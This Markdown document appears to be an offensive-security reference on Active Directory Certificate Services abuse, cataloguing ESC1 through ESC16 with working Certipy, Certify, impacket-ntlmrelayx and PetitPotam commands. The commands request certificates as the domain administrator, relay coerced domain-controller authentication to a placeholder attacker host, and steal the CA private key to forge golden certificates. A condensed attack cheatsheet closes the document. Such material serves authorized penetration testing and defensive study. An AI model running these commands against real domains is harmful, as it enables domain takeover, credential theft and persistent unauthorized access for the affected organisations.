# AD CS Attacks — ESC1 to ESC16 (Certipy)

Deep reference for Active Directory Certificate Services (AD CS) abuse. Misconfigured certificate templates and CAs let a low-privileged user obtain a certificate that authenticates as a privileged principal (PKINIT → TGT → NT hash) — frequently the single fastest path to Domain/Enterprise Admin. Companion to `ad-enumeration-and-attacks.md` and `kerberos-attacks.md`.

> Tooling: **Certipy v5** (ly4k) covers enumeration and ESC1–ESC16. **Certify**/**ForgeCert** are the Windows/.NET equivalents. NTLM-relay ESCs (ESC8/ESC11) use `ntlmrelayx --adcs` or `certipy relay`.

---

## 1. Why AD CS Matters

A certificate with **Client Authentication** EKU (or SmartCardLogon/PKINIT/Any-Purpose) can be used to authenticate via Kerberos PKINIT. Certipy turns the issued `.pfx` into a TGT and recovers the account's NT hash. So: *control over who/what a cert is issued for = control over that identity.*

```bash
# Authenticate with ANY obtained certificate → TGT + NT hash (the universal final step)
certipy auth -pfx target.pfx -dc-ip <DC_IP>
certipy auth -pfx target.pfx -dc-ip <DC_IP> -ldap-shell      # drop into LDAP shell for follow-on
# If UnPAC-the-hash fails (e.g. AES-only), use the LDAP-shell or get a TGT and PtT.
```

---

## 2. Enumeration

```bash
# Find all vulnerable + enabled templates / CA misconfigs in one scan
certipy find -vulnerable -enabled -u user@domain.local -p 'pass' -dc-ip <DC_IP>
certipy find -u user@domain.local -p 'pass' -dc-ip <DC_IP> -stdout        # full, to terminal
certipy find -u user@domain.local -p 'pass' -dc-ip <DC_IP> -json          # machine-readable
# Output flags each template's ESC class ([!] Vulnerabilities: ESC1, ...).
```
```bash
# Quick triage from NetExec
nxc ldap <DC_IP> -u user -p pass -M adcs
```
```powershell
# Certify (Windows)
Certify.exe find /vulnerable
Certify.exe find /vulnerable /currentuser
```

---

## 3. The ESC Catalog

For each, the universal finish is `certipy auth -pfx <out>.pfx`. Replace `CA_NAME`, `<CA_HOST>`, template names as found.

### ESC1 — Enrollee supplies subject (SAN) + Client Auth, low-priv enroll
The template lets the requester specify an arbitrary SAN/UPN. Request a cert *as* a privileged user.
```bash
certipy req -u user@domain.local -p 'pass' -dc-ip <DC_IP> -target <CA_HOST> \
  -ca CA_NAME -template VulnTemplate -upn administrator@domain.local
# bind by SID too (defeats ESC9/strong-mapping):
certipy req ... -upn administrator@domain.local -sid 'S-1-5-21-...-500'
certipy auth -pfx administrator.pfx -dc-ip <DC_IP>
```

### ESC2 — Any-Purpose EKU (or no EKU)
Template grants Any-Purpose EKU → use the cert for client auth (and more). Often combine with on-behalf-of like ESC3.
```bash
certipy req -u user@domain.local -p 'pass' -dc-ip <DC_IP> -target <CA_HOST> -ca CA_NAME -template AnyPurposeTemplate
```

### ESC3 — Enrollment Agent certificate
Template grants the **Certificate Request Agent** EKU → request a cert *on behalf of* anyone.
```bash
# 1. Get the enrollment-agent cert
certipy req -u user@domain.local -p 'pass' -dc-ip <DC_IP> -target <CA_HOST> -ca CA_NAME -template EnrollmentAgent
# 2. Use it to enroll on behalf of a privileged user
certipy req -u user@domain.local -p 'pass' -dc-ip <DC_IP> -target <CA_HOST> -ca CA_NAME \
  -template User -pfx user.pfx -on-behalf-of 'domain\administrator'
certipy auth -pfx administrator.pfx -dc-ip <DC_IP>
```

### ESC4 — Write access to a template (template hijack)
You have write rights on a template → make it ESC1-vulnerable, exploit, revert.
```bash
certipy template -u user@domain.local -p 'pass' -dc-ip <DC_IP> -template VulnTemplate -write-default-configuration
# then exploit exactly like ESC1:
certipy req -u user@domain.local -p 'pass' -dc-ip <DC_IP> -target <CA_HOST> -ca CA_NAME \
  -template VulnTemplate -upn administrator@domain.local -sid 'S-1-5-21-...-500'
# revert:
certipy template -u user@domain.local -p 'pass' -template VulnTemplate -configuration VulnTemplate.json
```

### ESC5 — Vulnerable PKI object/ACL (CA computer, CA's AD object, etc.)
Write access to an object the PKI trusts (CA server object, OID container, etc.) → escalate. Exploitation depends on the specific object; often reduces to ESC4/ESC7 or compromising the CA host.

### ESC6 — `EDITF_ATTRIBUTESUBJECTALTNAME2` on the CA
CA-wide flag lets ANY template honor a requester-supplied SAN. Treat any enrollable client-auth template as ESC1.
```bash
certipy req -u user@domain.local -p 'pass' -dc-ip <DC_IP> -target <CA_HOST> -ca CA_NAME \
  -template User -upn administrator@domain.local -sid 'S-1-5-21-...-500'
```

### ESC7 — Dangerous CA rights (ManageCA / ManageCertificates)
With **ManageCA** you can add yourself as an officer (ManageCertificates), enable a template, and approve your own pending requests; also flip ESC6 on.
```bash
# Add yourself as officer (ManageCertificates) using ManageCA
certipy ca -u admin@domain.local -p 'pass' -target <CA_HOST> -ca CA_NAME -add-officer 'attacker'
# Enable a client-auth template if needed
certipy ca -u admin@domain.local -p 'pass' -target <CA_HOST> -ca CA_NAME -enable-template 'SubCA'
# Request (will go pending), then approve it as officer, then retrieve:
certipy req -u attacker@domain.local -p 'pass' -ca CA_NAME -template SubCA -upn administrator@domain.local -target <CA_HOST>   # note request id
certipy ca -u attacker@domain.local -p 'pass' -ca CA_NAME -target <CA_HOST> -issue-request <REQ_ID>
certipy req -u attacker@domain.local -p 'pass' -ca CA_NAME -target <CA_HOST> -retrieve <REQ_ID>
```

### ESC8 — NTLM relay to AD CS HTTP enrollment
The CA's web enrollment (`/certsrv`) accepts NTLM and lacks EPA → relay a coerced machine/DC account and get a cert for it.
```bash
# Relay engine
impacket-ntlmrelayx -t http://<CA_HOST>/certsrv/certfnsh.asp -smb2support --adcs --template DomainController
# or Certipy's own relay
certipy relay -target http://<CA_HOST> -template DomainController
# Coerce a DC to authenticate (PrinterBug/PetitPotam/DFSCoerce → see ntlm-relay-and-coercion.md)
python3 PetitPotam.py -u user -p pass <ATTACKER_IP> <DC_IP>
# Use the relayed DC$ cert:
certipy auth -pfx dc01.pfx -dc-ip <DC_IP>            # DC$ TGT → DCSync
```

### ESC9 — No security extension (missing SID) + weak mapping
Template has `CT_FLAG_NO_SECURITY_EXTENSION`; with weak/UPN-based mapping you can request a cert whose UPN points at a victim (after changing your own UPN if you control it). Persists across password changes.
```bash
certipy req -u user@domain.local -p 'pass' -dc-ip <DC_IP> -target <CA_HOST> -ca CA_NAME -template ESC9
certipy auth -pfx esc9.pfx -dc-ip <DC_IP> -ldap-shell
```

### ESC10 — Weak certificate mapping on the DC
Registry-level weak mapping (`StrongCertificateBindingEnforcement`/`CertificateMappingMethods`). Similar UPN/SAN-mapping abuse to ESC9, exploited via account UPN manipulation + cert request.

### ESC11 — NTLM relay to CA RPC (ICertPassage / no `IF_ENFORCEENCRYPTICERTREQUEST`)
The CA RPC interface accepts unencrypted NTLM → relay over RPC.
```bash
impacket-ntlmrelayx -t rpc://<CA_HOST> -rpc-mode ICPR -icpr-ca-name CA_NAME --adcs --template Machine
# (Certipy: certipy relay -target rpc://<CA_HOST> ...)
```

### ESC13 — Issuance policy linked to an AD group (`msDS-OIDToGroupLink`)
Enrolling in a template whose issuance policy OID is linked to a privileged group grants that group membership in the resulting token.
```bash
certipy req -u user@domain.local -p 'pass' -dc-ip <DC_IP> -target <CA_HOST> -ca CA_NAME -template ESC13Template
certipy auth -pfx esc13.pfx -dc-ip <DC_IP> -ldap-shell
```

### ESC14 — Weak explicit mapping via `altSecurityIdentities`
Write access to a target's `altSecurityIdentities` lets you map your cert to their identity (or a weak existing mapping). Exploited by setting the mapping then authenticating with your cert as the victim.

### ESC15 / CVE-2024-49019 — Application Policies on V1 templates ("EKUwu")
Unpatched CAs let you inject arbitrary **application policies** into a V1-schema template, e.g. adding Certificate-Request-Agent or Client-Auth even when the template's EKU forbids it.
```bash
certipy req -u user@domain.local -p 'pass' -dc-ip <DC_IP> -target <CA_HOST> -ca CA_NAME \
  -template WebServer -application-policies '1.3.6.1.4.1.311.20.2.1'    # Certificate Request Agent
# then on-behalf-of like ESC3:
certipy req -u user@domain.local -pfx user.pfx -ca CA_NAME -template User -on-behalf-of 'domain\administrator' -target <CA_HOST>
# Or inject Client Auth and use directly:
certipy req ... -application-policies '1.3.6.1.5.5.7.3.2' -upn administrator@domain.local
```

### ESC16 — CA-wide disabled SID security extension
The CA globally omits `szOID_NTDS_CA_SECURITY_EXT` (the ESC9 condition applied CA-wide). Every issued cert bypasses SID validation → request as a privileged UPN.
```bash
certipy req -u user@domain.local -p 'pass' -dc-ip <DC_IP> -target <CA_HOST> -ca CA_NAME \
  -template User -upn administrator@domain.local
certipy auth -pfx administrator.pfx -dc-ip <DC_IP> -ldap-shell
```

---

## 4. Persistence via Certificates

- A stolen/forged user or machine certificate authenticates for its **validity period** regardless of password resets — durable persistence (DPERSIST).
- **Golden Certificate**: steal the CA's private key (`certipy ca -backup`, or via ESC7/host compromise) → forge arbitrary client-auth certs offline with **ForgeCert**.
```bash
certipy ca -u admin@domain.local -p 'pass' -target <CA_HOST> -ca CA_NAME -backup     # exfil CA key
# ForgeCert.exe --CaCertPath ca.pfx --Subject ... --SubjectAltName administrator@domain.local --NewCertPath fake.pfx
```

---

## 5. Cheatsheet

```bash
# ENUM
certipy find -vulnerable -enabled -u u@dom -p p -dc-ip <DC>

# ESC1 / ESC6 / ESC16 (SAN injection)
certipy req -u u@dom -p p -dc-ip <DC> -target <CA> -ca CA -template T -upn administrator@dom -sid S-1-5-...-500
certipy auth -pfx administrator.pfx -dc-ip <DC>

# ESC3 (enroll agent)
certipy req -u u@dom -p p -target <CA> -ca CA -template EnrollmentAgent
certipy req -u u@dom -pfx u.pfx -target <CA> -ca CA -template User -on-behalf-of 'dom\administrator'

# ESC7 (ManageCA)
certipy ca -u u@dom -p p -target <CA> -ca CA -add-officer attacker

# ESC8 (relay)
impacket-ntlmrelayx -t http://<CA>/certsrv/certfnsh.asp -smb2support --adcs --template DomainController
PetitPotam.py -u u -p p <ATTACKER> <DC>

# ESC15 (EKUwu / CVE-2024-49019)
certipy req -u u@dom -p p -target <CA> -ca CA -template WebServer -application-policies '1.3.6.1.4.1.311.20.2.1'

# Golden cert
certipy ca -u admin@dom -p p -target <CA> -ca CA -backup
```

| ESC | One-liner essence |
|-----|-------------------|
| ESC1/6/16 | request cert with attacker-chosen SAN/UPN |
| ESC2 | any-purpose EKU → enroll-on-behalf |
| ESC3 | get enrollment-agent cert → on-behalf-of |
| ESC4 | write template → make it ESC1 |
| ESC7 | ManageCA → add officer / enable template / approve |
| ESC8/11 | relay coerced auth → HTTP(8)/RPC(11) enrollment |
| ESC9/10/14 | weak mapping (missing SID / altSecurityIdentities) |
| ESC13 | issuance-policy OID linked to privileged group |
| ESC15 | inject application policies into V1 template (CVE-2024-49019) |

---

## References

- Certipy wiki — https://github.com/ly4k/Certipy/wiki
- SpecterOps – Certified Pre-Owned (original ESC1-8 paper) — https://posts.specterops.io/certified-pre-owned-d95910965cd2
- xbz0n – Breaking ADCS: ESC1 to ESC16 — https://xbz0n.sh/blog/adcs-complete-attack-reference
- The Hacker Recipes – AD CS — https://www.thehacker.recipes/ad/movement/adcs/
- HackTricks – AD CS Domain Escalation — https://hacktricks.wiki/en/windows-hardening/active-directory-methodology/ad-certificates/domain-escalation.html
- TrustedSec – EKUwu (ESC15 / CVE-2024-49019) — https://trustedsec.com/blog/ekuwu-not-just-another-ad-cs-esc
- Certify / ForgeCert (GhostPack) — https://github.com/GhostPack/Certify , https://github.com/GhostPack/ForgeCert
